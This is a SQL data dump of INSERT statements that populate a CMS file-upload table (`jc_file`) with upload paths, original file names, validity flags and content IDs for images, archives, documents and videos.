INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10101006fqv3.jpg','topic01.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10110628vfwz.jpg','content-nycs.jpg',1,100);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10110634gxcz.jpg','dl-nycs.jpg',1,100);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10110654vib6.jpg','download01.jpg',1,100);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10110756cg7o.zip','演示.zip',1,100);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10111518cqda.zip','演示.zip',1,101);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10111549rupn.jpg','content-xunlei.jpg',1,101);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101116034e14.jpg','download05.jpg',1,101);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10111618rhdk.jpg','dl-xunlei7.jpg',1,101);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10111758q1kj.zip','演示.zip',1,102);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101119026ukx.jpg','content-360safe.jpg',1,102);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101119092w8r.jpg','dl-360safe.jpg',1,102);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10112023kqfp.jpg','content-sougou.jpg',1,103);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101120330mpz.jpg','dl-sougou.jpg',1,103);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101120397iez.zip','演示.zip',1,103);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10112554wirt.zip','演示.zip',1,104);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10112657zklb.jpg','content-yy.jpg',1,104);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10112706jiii.jpg','dl-YY.jpg',1,104);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10112814u17l.zip','演示.zip',1,105);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10112839cvwx.jpg','content-ali.jpg',1,105);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10112845wryq.jpg','dl-aliwwmaijia.jpg',1,105);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101130257966.zip','演示.zip',1,106);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113032zu0k.jpg','content-iqy.jpg',1,106);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101130399dbt.jpg','dl-QIY.jpg',1,106);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101131571wkz.zip','演示.zip',1,107);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113218ya2p.jpg','content-google.jpg',1,107);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113226knhj.jpg','dl-google.jpg',1,107);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101133341nc3.zip','演示.zip',1,108);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113354g71e.jpg','content-360exp.jpg',1,108);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113400utfn.jpg','dl-360exp.jpg',1,108);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113459gvbx.zip','演示.zip',1,109);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113506jz07.jpg','content-pptv.jpg',1,109);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/1011351336l0.jpg','dl-PPTV.jpg',1,109);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10113551yru8.jpg','content-txsp.jpg',1,110);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101135560ne4.jpg','dl-txsp.jpg',1,110);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101136270k36.zip','演示.zip',1,110);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10114452yjhh.jpg','zxcvx.jpg',1,111);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10114704dsba.jpg','cb.jpg',1,112);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101308178wzr.jpg','df.jpg',1,114);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101314450fs1.jpg','banner02.jpg',1,115);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101317064t3l.jpg','xZ.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10131759kpti.jpg','5672662427112447485.jpg',1,116);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101320442qbi.jpg','zdsad.jpg',1,117);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10132253w0rj.jpg','sf.jpg',1,118);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101326014zdc.jpg','banner02.jpg',1,119);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10133449hwwr.jpg','vjkhk.jpg',1,120);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10133710to3f.jpg','video_banner02.jpg',1,121);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10133842aiyf.png','video_Btn02.png',1,121);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10133954jfoc.jpg','video_banner01.jpg',1,122);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101340004te2.png','video_Btn01.png',1,122);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101340393eav.png','video_Btn03.png',1,123);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10134048htcl.jpg','video_banner03.jpg',1,123);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10134238qppo.jpg','video10.jpg',1,124);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10134440wmng.jpg','video01.jpg',1,125);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101345564pok.jpg','video09.jpg',1,126);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101346227ayf.jpg','video07.jpg',1,127);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101346473kic.jpg','video05.jpg',1,128);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10134720z8a5.jpg','zdsad.jpg',1,129);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/110911592mxa.jpg','hlwjia.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/110919049wkh.jpg','qglh.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11092148co74.jpg','qglh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11092540p27t.jpg','zph.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11092701sxi4.jpg','zph.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11093237z5e8.jpg','fghj.jpg',1,141);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11111659rnpb.mp4','/u/cms/www/201610/11111659rnpb.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11111729glis.docx','测试.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11111806t1hj.mp4','/u/cms/www/201610/11111806t1hj.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/111118456g3w.docx','测试.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/111118588poy.mp4','/u/cms/www/201610/111118588poy.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11112051yx2x.mp4','/u/cms/www/201610/11112051yx2x.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/111121133pnh.mp4','/u/cms/www/201610/111121133pnh.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/111121213xss.docx','测试.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11112910l4qa.jpg','3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/11113157dh9e.jpg','0.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22093458gynd.jpg','22093458gynd.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22093502mmft.jpg','22093502mmft.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22093506l8pv.jpg','22093506l8pv.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22093509qm3l.jpg','22093509qm3l.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22093513srmf.jpg','22093513srmf.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22094752xoxd.jpg','22094752xoxd.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22094906lrj8.jpg','22094906lrj8.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22094911xe9x.jpg','22094911xe9x.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22094915t8h1.jpg','22094915t8h1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22094918gnze.jpg','22094918gnze.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22100555lytj.jpg','22100555lytj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22100558gfsb.jpg','22100558gfsb.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22100601l1us.jpg','22100601l1us.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22100606t8mw.jpg','22100606t8mw.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/22100611o2gl.jpg','22100611o2gl.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172935t4sb.jpg','23172935t4sb.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172936acob.jpg','23172936acob.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172937bli1.jpg','23172937bli1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172937r23n.jpg','23172937r23n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172939ln5a.jpg','23172939ln5a.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/231729407e1v.jpg','231729407e1v.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/231729434x7h.jpg','231729434x7h.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172944o38x.jpg','23172944o38x.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172944vvdh.jpg','23172944vvdh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172946mzqx.jpg','23172946mzqx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/23172947nrrl.jpg','23172947nrrl.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/24102446b7al.jpg','24102446b7al.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/24102503z9wj.jpg','24102503z9wj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/2416455972ro.jpg','2416455972ro.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/241646340nq6.jpg','241646340nq6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/24164707ksjq.jpg','24164707ksjq.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/26115537aper.jpg','26115537aper.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/26115537rs0f.jpg','26115537rs0f.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/26150136kryi.txt','26150136kryi.txt',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/Thumbs.db','Thumbs.db',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/13135536pnt2.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/131359296e9c.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/1314055350gc.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/13140606bjte.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/13140635xydz.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/13140702pfne.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/13140909s64p.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/13141723ywh0.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/13142644qpdm.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/131429269ikl.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/131431450xia.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201401/131431578u9o.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/1316123792p0.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13163251c8d5.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/131634322gqg.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/131636277cxi.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13163934xmp0.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13164248ng73.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13165347xxty.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13170503bwpw.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13170603q1bw.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/131706463pqt.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13172446osvy.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13172626x71c.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13173752etj3.zip','ChromeSetup.zip',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/13173805fii8.zip','ChromeSetup.zip',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14091703u57k.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14091741h0w0.zip','ChromeSetup.zip',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14092030cnyx.mp4','18183451i5bi.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14092835ljai.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14095531y5tg.zip','ChromeSetup.zip',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14095543za61.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14095551kk1a.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14095759mdqw.docx','0_開發需求_.docx',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14102936l7gw.txt','freemarker.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14104521p9ey.zip','bbs-update-2012-11-2.zip',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14105137jxtn.mp4','/v6/u/cms/www/201403/14105137jxtn.mp4',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14112725dsar.zip','/v6/u/cms/www/201403/14112725dsar.zip',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14130702z3xz.png','/v6/u/cms/www/201403/14130702z3xz.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/14165746s64i.pdf','1.pdf',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201403/1914315903bj.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/20151821gj8y.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/2015202141s0.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/211128348kuw.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/2111305770l1.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/21113452hsxh.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/211137096eif.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/211149148tx0.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/21115759y8sm.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/211511276v74.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/21151948k1fh.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/21154820xtfs.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/2115485050rw.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/21155236mk9b.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22084701xqxy.doc','/v6/u/cms/www/201404/22084701xqxy.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22084833ys27.doc','/v6/u/cms/www/201404/22084833ys27.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22111217hftv.doc','Linux开启mysql远程连接.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22111332dwt3.doc','Linux开启mysql远程连接.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22114143pw1a.doc','Linux开启mysql远程连接.doc',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22132355vqdf.txt','IBM LDAP.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22133304pnoh.txt','/v6/u/cms/www/201404/22133304pnoh.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22133312pz3j.exe','wpp.exe',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22135235m1m1.txt','cmstop.txt',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/v6/u/cms/www/201404/22135348pbqp.swf','2.swf',0,NULL);
